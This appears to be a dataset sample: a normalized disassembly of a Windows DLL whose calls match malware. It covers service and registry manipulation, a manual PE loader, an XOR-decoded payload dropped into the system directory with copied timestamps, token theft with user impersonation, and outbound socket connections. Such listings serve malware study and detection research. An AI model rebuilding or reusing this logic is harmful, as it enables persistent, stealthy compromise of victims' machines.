push rw-data
push edx
mov [ esp + 0x3c ] 0x104
call esi
lea eax [ esp + 0x4c ]
push 0x5c
push eax
call [ strrchr@IAT ]
add esp 0x8
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call [ RegCloseKey@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x1c0
retn
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x10 ]
or ah 0x1
push edi
mov [ esp + 0x20 ] eax
lea eax [ esp + 0x20 ]
push eax
push edi
push ebx
push rw-data
push ecx
call ebp
push 0xf003f
push ebx
push ebx
call [ OpenSCManagerA@IAT ]
mov ecx [ esp + 0x1d4 ]
push 0xf003f
push ecx
push eax
mov [ esp + 0x38 ] eax
call [ OpenServiceA@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
inc eax
push rw-data
push eax
call [ _strcmpi@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x4c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x4c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x4c ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x4c ]
push ecx
mov ecx [ esp + 0x18 ]
push eax
push 0x2
push 0x0
push rw-data
push ecx
call ebp
mov edx [ esp + 0x14 ]
mov esi [ RegDeleteValueA@IAT ]
push rw-data
push edx
call esi
mov eax [ esp + 0x14 ]
push rw-data
push eax
call esi
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x28 ]
push 0x4
push ecx
push 0x4
push 0x0
push rw-data
push edx
mov [ esp + 0x40 ] 0x2
call ebp
mov eax [ esp + 0x14 ]
mov esi [ RegCloseKey@IAT ]
push eax
call esi
mov ecx [ esp + 0x10 ]
push ecx
call esi
test ebx ebx
je r-xdata
lea edx [ esp + 0x30 ]
push edx
push 0x1
push ebx
call [ ControlService@IAT ]
mov ecx [ esp + 0x14 ]
mov esi [ RegCloseKey@IAT ]
push ecx
call esi
mov edx [ esp + 0x10 ]
push edx
call esi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x1c0
retn
mov esi [ CloseServiceHandle@IAT ]
push ebx
call esi
mov ecx [ esp + 0x2c ]
push ecx
call esi
mov edx [ esp + 0x1d4 ]
lea eax [ esp + 0x18 ]
push eax
push 0x1
push ebx
mov [ esp + 0x24 ] edx
call [ StartServiceA@IAT ]
mov [ esp + 0x18 ] eax
sub_100035d0
mov ecx [ rw-data ]
sub esp 0x30c
lea eax [ esp ]
push esi
push edi
push 0x104
push eax
push ecx
call [ GetModuleFileNameA@IAT ]
mov esi [ _strlwr@IAT ]
lea edx [ esp + 0x8 ]
push edx
call esi
add esp 0x4
lea eax [ esp + 0x10c ]
push 0x104
push eax
call [ GetWindowsDirectoryA@IAT ]
lea ecx [ esp + 0x10c ]
push ecx
call esi
lea edi [ esp + 0x110 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x110 ]
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0xc ]
push ecx
push edx
push eax
call [ strncmp@IAT ]
add esp 0x10
test eax eax
je r-xdata
call sub_10003f80
push rw-data
call sub_10003030
push rw-data
call sub_10003170
mov al [ rw-data ]
add esp 0x8
test al al
pop edi
pop esi
je r-xdata
mov ecx [ rw-data ]
push ebx
mov [ esp + 0x214 ] ecx
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x218 ]
lea edx [ esp + 0xc ]
push 0x5c
[ edi ]
push edx
call [ strrchr@IAT ]
mov edi eax
or ecx 0xffffffff
inc edi
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x21c ]
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x21c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_10003030
add esp 0xc
pop ebx
mov ecx [ rw-data ]
push ecx
call sub_10003f00
add esp 0x4
test eax eax
jne r-xdata
push rw-data
call sub_100032d0
add esp 0x4
push 0x0
push 0x0
call eax
lea edx [ esp ]
push edx
call [ LoadLibraryA@IAT ]
test eax eax
je r-xdata
xor eax eax
add esp 0x30c
retn
push rw-data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
sub_10003730
sub esp 0x1c
mov eax [ esp + 0x20 ]
xor ecx ecx
mov [ esp + 0x4 ] eax
cmp eax 0x2
mov eax [ esp + 0x28 ]
mov [ esp ] 0x10
setne cl
test eax eax
mov [ esp + 0x8 ] ecx
jne r-xdata
mov [ esp + 0xc ] 0x42a
mov edx [ esp + 0x24 ]
mov [ esp + 0xc ] edx
jmp r-xdata
mov ecx [ esp + 0x30 ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x2c ]
lea edx [ esp ]
mov [ esp + 0x14 ] eax
mov eax [ rw-data ]
push edx
push eax
mov [ esp + 0x20 ] ecx
call [ SetServiceStatus@IAT ]
add esp 0x1c
retn
sub_100037a0
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call [ CloseHandle@IAT ]
retn
mov eax [ esp + 0x4 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x1
call sub_10003730
add esp 0x14
sub_100037d0
mov eax [ esp + 0x4 ]
dec eax
je r-xdata
push 0x1388
push 0x1
push 0x0
push 0x0
push 0x3
call sub_10003730
mov eax [ rw-data ]
add esp 0x14
push eax
call [ SetEvent@IAT ]
retn
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call sub_10003730
add esp 0x14
retn
sub_10003810
sub esp 0x30c
push esi
push edi
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0x15 ]
mov [ esp + 0x14 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0x95 ]
mov [ esp + 0x94 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
xor esi esi
mov ecx 0x7f
xor eax eax
lea edi [ esp + 0x116 ]
mov [ esp + 0x114 ] si
mov edx [ esp + 0x318 ]
[ edi ]
stosw [ edi ]
lea eax [ esp + 0x114 ]
push 0x100
push eax
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push edx
push esi
push esi
call [ MultiByteToWideChar@IAT ]
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x114 ]
push ecx
push edx
mov [ esp + 0x10 ] esi
call [ CommandLineToArgvW@IAT ]
mov ecx [ esp + 0x8 ]
mov [ esp + 0x10 ] esi
cmp ecx esi
jle r-xdata
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea eax [ esp + 0x94 ]
mov edx ecx
mov esi edi
mov edi rw-data
push eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call [ atoi@IAT ]
push 0x64
mov [ rw-data ] ax
call sub_10004c60
add esp 0x8
pop edi
pop esi
add esp 0x30c
retn
push ebx
mov ebx [ wcslen@IAT ]
push ebp
mov ebp [ WideCharToMultiByte@IAT ]
mov [ esp + 0x14 ] eax
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
inc ecx
add eax 0x4
cmp ecx edx
mov [ esp + 0x18 ] ecx
mov [ esp + 0x14 ] eax
jl r-xdata
add esi 0x2
cmp [ esi ] 0x69
jne r-xdata
mov esi [ eax ]
cmp [ esi ] 0x2d
jne r-xdata
pop ebp
pop ebx
cmp [ esi ] 0x70
jne r-xdata
push 0x0
push 0x0
lea eax [ esp + 0x24 ]
lea edi [ esi + 0x2 ]
push 0x80
push eax
push edi
call ebx
add esp 0x4
push eax
push edi
push 0x0
push 0x0
call ebp
push 0x0
push 0x0
lea ecx [ esp + 0xa4 ]
add esi 0x2
push 0x80
push ecx
push esi
call ebx
add esp 0x4
push eax
push esi
push 0x0
push 0x0
call ebp
maintest
mov eax [ esp + 0xc ]
push esi
test eax eax
je r-xdata
push 0x1
call sub_100035d0
cmp [ eax ] 0x2d
jne r-xdata
push 0x2710
call esi
jmp r-xdata
push eax
call sub_10003810
jmp r-xdata
mov esi [ Sleep@IAT ]
add esp 0x4
ServiceMain
mov eax [ rw-data ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
cmp edi eax
jne r-xdata
cmp edi 0x14
jne r-xdata
cmp esi 0x1000
jbe r-xdata
push 0x0
push 0x0
push sub_10004c60
call [ _beginthread@IAT ]
add esp 0xc
test edi edi
je r-xdata
cmp esi edi
jne r-xdata
mov edi [ VirtualProtect@IAT ]
lea eax [ esp + 0xc ]
push eax
push 0x4
push 0x4
push esi
call edi
test eax eax
je r-xdata
pop edi
pop esi
retn 0x8
cmp edi 0x14
jae r-xdata
mov [ rw-data ] 0x1
mov eax [ rw-data ]
push eax
call sub_10003f00
add esp 0x4
test eax eax
je r-xdata
push rw-data
push rw-data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
lea ecx [ esp + 0xc ]
mov [ esi ] eax
mov edx [ esp + 0xc ]
push ecx
push edx
push 0x4
push esi
call edi
cmp esi 0x1000
jbe r-xdata
push 0x14
push 0x14
call eax
pop edi
pop esi
retn 0x8
test esi esi
je r-xdata
mov [ rw-data ] 0x1
mov ecx [ esi ]
push sub_100037d0
push ecx
call [ RegisterServiceCtrlHandlerW@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
push 0x1388
push 0x1
push 0x0
push 0x0
push 0x2
call sub_10003730
add esp 0x14
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
push eax
call sub_100037a0
add esp 0x4
pop edi
pop esi
retn 0x8
push 0x0
push 0x0
push 0x1
push 0x0
call [ CreateEventA@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
call [ GetLastError@IAT ]
push eax
call sub_100037a0
add esp 0x4
pop edi
pop esi
retn 0x8
push 0x3e8
push 0x2
push 0x0
push 0x0
push 0x2
call sub_10003730
add esp 0x14
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
push eax
call sub_100037a0
add esp 0x4
pop edi
pop esi
retn 0x8
push 0x1388
push 0x3
push 0x0
push 0x0
push 0x2
call sub_10003730
add esp 0x14
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
push eax
call sub_100037a0
add esp 0x4
pop edi
pop esi
retn 0x8
push 0x0
push 0x0
push 0x0
push 0x0
push 0x4
call sub_10003730
add esp 0x14
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
push eax
call sub_100037a0
add esp 0x4
pop edi
pop esi
retn 0x8
mov edx [ rw-data ]
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
push 0x0
call sub_100037a0
add esp 0x4
call [ GetLastError@IAT ]
push eax
call sub_100037a0
add esp 0x4
pop edi
pop esi
retn 0x8
sub_10003bc0
sub esp 0x28
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x30 ]
push ebx
push ebp
push esi
mov esi [ edx + 0x3c ]
cmp esi eax
push edi
mov [ esp + 0x10 ] esi
jae r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x28
retn
test esi esi
je r-xdata
cmp [ esi + edx ] 0x4550
jne r-xdata
cmp [ esi + edx + 0x4 ] 0x14c
jne r-xdata
cmp [ esi + edx + 0x18 ] 0x10b
jne r-xdata
xor ebp ebp
mov ecx 0x6
mov bp [ esi + edx + 0x6 ]
xor eax eax
lea edi [ esp + 0x20 ]
mov [ esp + 0x1c ] 0x0
[ edi ]
mov edi [ esi + edx + 0x34 ]
mov ebx [ esi + edx + 0x50 ]
lea eax [ esp + 0x1c ]
push 0x1c
push eax
push edi
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] edi
call [ VirtualQuery@IAT ]
mov eax [ esp + 0x20 ]
test eax eax
jne r-xdata
xor edi edi
cmp [ esp + 0x30 ] 0x1
jne r-xdata
push 0x40
push 0x1000
push ebx
push eax
call edi
lea ecx [ ebp + ebp * 4 ]
mov ebx eax
mov edi ebx
lea ecx [ esi + ecx * 8 + 0xf8 ]
mov esi [ esp + 0x3c ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
test ebp ebp
[ edi ] [ esi ]
jle r-xdata
cmp [ esp + 0x2c ] 0x10000
jne r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x3c ]
mov [ esp + 0x40 ] 0x1
mov eax [ eax + ecx + 0x80 ]
add eax ebx
add eax 0x10
cmp [ eax ] 0x0
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x3c ]
lea eax [ eax + ecx + 0x10c ]
cmp [ esp + 0x28 ] ebx
ja r-xdata
mov edi [ esp + 0x3c ]
mov eax [ esp + 0x10 ]
mov ecx [ eax + edi + 0xa0 ]
mov eax [ ecx + ebx ]
add ecx ebx
test eax eax
je r-xdata
mov ebp eax
mov esi [ eax ]
mov edi [ esp + 0x3c ]
mov ecx [ eax - 0x4 ]
add esi edi
mov edi [ eax - 0x8 ]
mov edx ecx
add edi ebx
add eax 0x28
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
dec ebp
[ edi ] [ esi ]
jne r-xdata
push 0x40
push 0x2000
push ebx
push edi
mov edi [ VirtualAlloc@IAT ]
call edi
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
push 0x0
push 0x1
push ebx
mov eax [ ecx + edi + 0x28 ]
add eax ebx
call eax
test eax eax
je r-xdata
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
push 0x4000
push edx
push ebx
call [ VirtualFree@IAT ]
mov eax [ ebp - 0x4 ]
add eax ebx
cmp [ eax ] 0x0
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
add esp 0x28
retn
add eax 0xfffffff8
lea esi [ ecx + 0x8 ]
shr eax 0x1
test eax eax
jle r-xdata
push eax
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
add ecx [ ecx + 0x4 ]
cmp [ ecx ] 0x0
jne r-xdata
mov edx eax
mov esi [ ebp ]
add esi ebx
mov eax [ esi ]
test eax eax
je r-xdata
add esi 0x2
dec edx
jne r-xdata
mov ebp [ ecx ]
and eax 0xfff
add eax ebx
add eax ebp
mov ebp ebx
sub ebp [ esp + 0x18 ]
add [ eax ] ebp
mov eax [ ebp + 0x14 ]
add ebp 0x14
test eax eax
jne r-xdata
test eax 0x80000000
jne r-xdata
mov ax [ esi ]
mov ebp eax
and ebp 0xf000
cmp ebp 0x3000
jne r-xdata
mov eax [ esp + 0x40 ]
test eax eax
je r-xdata
mov eax [ esp + 0x40 ]
test eax eax
jne r-xdata
and eax 0xffff
lea eax [ eax + ebx + 0x2 ]
jmp r-xdata
push edi
call [ FreeLibrary@IAT ]
mov [ esp + 0x40 ] 0x0
mov [ esi ] eax
mov eax [ esi + 0x4 ]
add esi 0x4
test eax eax
jne r-xdata
push eax
push edi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
jmp r-xdata
sub_10003e30
push ebx
mov eax [ esp + 0x8 ]
push ebp
push esi
push edi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x3
push 0x80000000
push eax
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push 0x0
push esi
call [ GetFileSize@IAT ]
mov ebp eax
cmp ebp 0x2bc
jae r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x2
push 0x0
push esi
call [ CreateFileMappingA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x4
push ebx
call [ MapViewOfFile@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
push ebp
push edi
call sub_10003bc0
add esp 0x8
mov ebp eax
push edi
call [ UnmapViewOfFile@IAT ]
mov edi [ CloseHandle@IAT ]
push ebx
call edi
push esi
call edi
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
mov edi [ CloseHandle@IAT ]
push ebx
call edi
push esi
call edi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
sub_10003f00
sub esp 0x104
push esi
mov esi [ esp + 0x10c ]
test esi esi
push edi
jne r-xdata
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x8 ]
push 0x104
[ edi ]
lea eax [ esp + 0xc ]
push eax
push esi
call [ GetModuleFileNameA@IAT ]
push rw-data
push esi
call [ GetProcAddress@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop edi
xor eax eax
pop esi
add esp 0x104
retn
lea ecx [ esp + 0x8 ]
push ecx
call sub_10003e30
add esp 0x4
test eax eax
jne r-xdata
pop edi
pop esi
add esp 0x104
retn
sub eax esi
add eax edi
pop edi
pop esi
add esp 0x104
retn
pop edi
pop esi
add esp 0x104
retn
sub_10003f80
sub esp 0x120
mov ecx 0x41
xor eax eax
push ebx
push ebp
push esi
push edi
lea edi [ esp + 0x2c ]
push 0x104
[ edi ]
lea eax [ esp + 0x30 ]
push eax
call [ GetSystemDirectoryA@IAT ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
lea edx [ esp + 0x2c ]
[ edi ]
not ecx
sub edi ecx
mov ebx ecx
mov esi edi
or ecx 0xffffffff
mov edi edx
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0x2c ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0x2c ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x2c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x120
retn
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
lea ecx [ esp + 0x40 ]
push 0x40000000
push ecx
call [ CreateFileA@IAT ]
mov ebp eax
cmp ebp 0xffffffff
je r-xdata
push 0x1980
call ??2@YAPAXI@Z
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
lea eax [ esp + 0x24 ]
lea ecx [ esp + 0x10 ]
push eax
lea edx [ esp + 0x20 ]
push ecx
push edx
call sub_10002f90
add esp 0xc
test eax eax
je r-xdata
mov ecx 0x660
mov esi rw-data
mov edi ebx
xor eax eax
[ edi ] [ esi ]
push ebp
call [ CloseHandle@IAT ]
lea eax [ esp + 0x24 ]
lea ecx [ esp + 0x10 ]
push eax
lea edx [ esp + 0x20 ]
push ecx
push edx
push ebp
call [ SetFileTime@IAT ]
mov cl [ eax + ebx ]
xor cl 0xac
mov [ eax + ebx ] cl
inc eax
cmp eax 0x1980
jl r-xdata
lea edx [ esp + 0x18 ]
push 0x0
push edx
push 0x1980
push ebx
push ebp
call [ WriteFile@IAT ]
push ebx
call ??3@YAXPAX@Z
add esp 0x4
sub_10004100
sub esp 0x128
push ebx
push esi
xor ebx ebx
push edi
push ebx
push 0x2
call CreateToolhelp32Snapshot
mov esi eax
mov ecx 0x49
xor eax eax
lea edi [ esp + 0x10 ]
[ edi ]
lea eax [ esp + 0xc ]
mov [ esp + 0xc ] 0x128
push eax
push esi
call Process32First
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
pop edi
mov eax ebx
pop esi
pop ebx
add esp 0x128
retn
mov edi [ esp + 0x138 ]
push ebp
mov ebp [ _strcmpi@IAT ]
lea edx [ esp + 0x10 ]
push edx
push esi
call Process32Next
test eax eax
jne r-xdata
lea ecx [ esp + 0x34 ]
push ecx
push edi
call ebp
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
pop ebp
mov ebx [ esp + 0x18 ]
sub_10004190
mov eax [ rw-data ]
push esi
test eax eax
jne r-xdata
pop esi
retn
push rw-data
call sub_10004100
add esp 0x4
test eax eax
je r-xdata
push eax
push 0x0
push 0x400
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
push rw-data
push 0xf01ff
push esi
call [ OpenProcessToken@IAT ]
push esi
call [ CloseHandle@IAT ]
sub_100041e0
mov eax [ rw-data ]
push esi
xor esi esi
test eax eax
jne r-xdata
call sub_10004190
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
push eax
call [ ImpersonateLoggedOnUser@IAT ]
pop esi
retn
sub_10004230
sub esp 0x10c
mov eax [ esp + 0x110 ]
lea ecx [ esp ]
push ecx
lea edx [ esp + 0xc ]
mov [ esp + 0x10 ] eax
push 0x0
push edx
inc eax
push 0x0
push eax
mov [ esp + 0x14 ] 0x14
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x1c ] 0x1
call [ select@IAT ]
add esp 0x10c
retn
sub_10004280
sub esp 0x10c
mov eax [ esp + 0x110 ]
lea ecx [ esp ]
push ecx
mov [ esp + 0x10 ] eax
push 0x0
lea edx [ esp + 0x10 ]
push 0x0
inc eax
push edx
push eax
mov [ esp + 0x14 ] 0x14
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x1c ] 0x1
call [ select@IAT ]
add esp 0x10c
retn
sub_100042f0
mov edx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
xor eax eax
mov ecx esi
mov ecx [ esp + 0x10 ]
mov [ esi + eax * 8 + 0x4 ] ecx
pop esi
retn
inc eax
add ecx 0x8
cmp eax 0x8
jl r-xdata
cmp [ ecx ] edx
je r-xdata
pop esi
retn
sub_10004320
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
xor eax eax
xor ecx ecx
xor esi esi
lea edx [ edi + 0x4 ]
inc ecx
add edx 0x8
cmp ecx 0x8
jl r-xdata
mov eax ecx
lea esi [ ecx * 8 ]
mov ebx [ edx ]
mov ebp [ esi + edi + 0x4 ]
cmp ebx ebp
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
sub_10004360
sub esp 0x40
push ebx
push esi
push edi
mov edi [ esp + 0x50 ]
lea esi [ esp + 0xc ]
mov ebx 0x8
push edi
call sub_10004320
mov ecx [ edi + eax * 8 ]
mov edx [ edi + eax * 8 + 0x4 ]
mov [ esi ] ecx
mov [ esi + 0x4 ] edx
add esp 0x4
add esi 0x8
dec ebx
mov [ edi + eax * 8 + 0x4 ] 0x0
jne r-xdata
mov ecx 0x10
lea esi [ esp + 0xc ]
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
add esp 0x40
retn
sub_100043b0
sub esp 0x1c
mov eax [ esp + 0x20 ]
push ebx
push ebp
push esi
push edi
push 0x1000
mov [ eax ] 0x0
call ??2@YAPAXI@Z
mov ebp eax
mov ecx 0x400
xor eax eax
mov edi ebp
[ edi ]
mov ecx [ esp + 0x3c ]
add esp 0x4
xor esi esi
mov [ esp + 0x28 ] ebp
mov [ esp + 0x10 ] esi
mov ebx ebp
mov [ esp + 0x14 ] ecx
mov [ esp + 0x1c ] 0x8
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x1c ]
add ecx 0x8
dec eax
mov [ esp + 0x14 ] ecx
mov [ esp + 0x1c ] eax
jne r-xdata
push eax
call [ gethostbyname@IAT ]
test eax eax
mov [ esp + 0x24 ] eax
je r-xdata
mov edx [ esp + 0x14 ]
mov eax [ edx ]
mov [ esp + 0x20 ] eax
shl eax 0x6
add eax rw-data
cmp [ eax ] 0x0
je r-xdata
test esi esi
jne r-xdata
mov ecx [ esp + 0x34 ]
mov [ esp + 0x38 ] 0x0
lea edx [ ecx + esi * 4 ]
mov [ esp + 0x18 ] edx
mov edx [ esp + 0x30 ]
pop edi
mov eax ebp
mov [ edx ] esi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
push ebp
call ??3@YAXPAX@Z
mov ecx [ esp + 0x34 ]
add esp 0x4
xor eax eax
mov [ ecx ] esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
mov ebp [ esp + 0x28 ]
mov edx [ eax ]
push edx
call [ inet_ntoa@IAT ]
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ esp + 0x38 ]
mov esi [ esp + 0x10 ]
add eax 0x4
mov [ esp + 0x38 ] eax
mov eax [ esp + 0x24 ]
jmp r-xdata
mov esi rw-data
mov eax [ eax + 0xc ]
mov ecx [ esp + 0x38 ]
mov eax [ eax + ecx ]
test eax eax
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov eax [ esp + 0x20 ]
xor ecx ecx
mov edi ebp
mov cx [ eax * 2 + rw-data ]
shl eax 0x10
or ecx eax
mov eax [ esp + 0x18 ]
mov [ eax ] ecx
mov ecx [ esp + 0x10 ]
inc ecx
add eax 0x4
mov [ esp + 0x10 ] ecx
mov [ esp + 0x18 ] eax
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea ebx [ ebx + ecx + 0x1 ]
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_10004580
sub esp 0x60
xor eax eax
push ebx
mov [ esp + 0x11 ] eax
push ebp
mov [ esp + 0x19 ] eax
push esi
mov [ esp + 0x21 ] eax
push edi
mov [ esp + 0x29 ] eax
lea ecx [ esp + 0x1c ]
mov [ esp + 0x2d ] ax
push 0x1
push ecx
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x37 ] al
call [ InitializeSecurityDescriptor@IAT ]
push 0x0
push 0x0
lea edx [ esp + 0x24 ]
push 0x1
push edx
call [ SetSecurityDescriptorDacl@IAT ]
xor eax eax
push rw-data
lea edx [ esp + 0x34 ]
mov [ esp + 0x18 ] eax
lea ecx [ esp + 0x20 ]
push rw-data
push edx
mov [ esp + 0x24 ] eax
mov [ esp + 0x1c ] 0xc
mov [ esp + 0x20 ] ecx
call [ sprintf@IAT ]
add esp 0xc
lea eax [ esp + 0x30 ]
lea ecx [ esp + 0x10 ]
push eax
push 0x0
push 0x0
push ecx
call [ CreateEventA@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax esi
call [ GetLastError@IAT ]
cmp eax 0xb7
push esi
jne r-xdata
call [ ResetEvent@IAT ]
mov ebx [ CloseHandle@IAT ]
call ebx
mov ebp [ Sleep@IAT ]
call [ GetLastError@IAT ]
push esi
mov edi eax
call ebx
xor eax eax
cmp edi 0xb7
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x60
retn
push 0x3e8
call ebp
jmp r-xdata
push 0x32
call ebp
lea edx [ esp + 0x30 ]
lea eax [ esp + 0x10 ]
push edx
push 0x0
push 0x0
push eax
call [ CreateEventA@IAT ]
mov esi eax
test esi esi
je r-xdata
sub_10004700
sub esp 0x180
push ebx
push ebp
push esi
push edi
push 0x0
push 0x1
push 0x2
call [ socket@IAT ]
mov ecx [ esp + 0x198 ]
mov esi eax
mov ebp [ htons@IAT ]
xor eax eax
mov [ esp + 0x10 ] eax
push ecx
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] 0x2
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] eax
call ebp
mov edx [ esp + 0x194 ]
mov ebx [ inet_addr@IAT ]
push edx
mov [ esp + 0x16 ] ax
call ebx
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x10 ]
push 0x10
push eax
push esi
call [ connect@IAT ]
test eax eax
jl r-xdata
push esi
call [ closesocket@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x180
retn
mov ecx 0x19
xor eax eax
